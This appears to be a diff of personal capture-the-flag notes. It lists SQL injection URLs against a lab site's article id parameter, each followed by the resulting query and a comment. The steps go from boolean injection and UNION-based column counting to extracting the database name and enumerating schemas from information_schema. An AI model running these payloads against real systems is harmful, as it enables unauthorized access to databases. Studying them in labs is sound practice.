@@ -1,10 +1,19 @@
 1.https://kgy9amx2.eu2.ctfio.com/article?id=0' or id = 2;--   
-# query for the above: select * from articles where released=1 and id='0' or id = 2;-- '
+# query for the above: select * from articles where released=1 and id=0' or id = 2;-- '
 
 2.https://kgy9amx2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,4;--
-# query for the above select * from articles where released=1 and id='0' UNION SELECT 1,2,3,4;--'
+# query for the above select * from articles where released=1 and id=0' UNION SELECT 1,2,3,4;--'
 
 
 3.https://kgy9amx2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,'hello';--'
-# query for the above select * from articles where released=1 and id='0' UNION SELECT 1,2,3,'hello';--''
+# query for the above select * from articles where released=1 and id=0' UNION SELECT 1,2,3,'hello';--''
 # 1,2,3,4 is to count columns. A string can replace an integer
+
+4.https://kgy9amx2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,database();--''
+# query for the above select * from articles where released=1 and id='0' UNION SELECT 1,2,3,database();--'''
+# gives the name of the database
+
+5.https://kgy9amx2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,SCHEMA_NAME from information_schema.SCHEMATA LIMIT 1,1;--
+# query for the above select * from articles where released=1 and id='0' UNION SELECT 1,2,3,SCHEMA_NAME from information_schema.SCHEMATA LIMIT 1,1;--'
+#Check all the names tof the databases that an application has access to 
+#LIMIT 1,1 means skip one row and only return one row
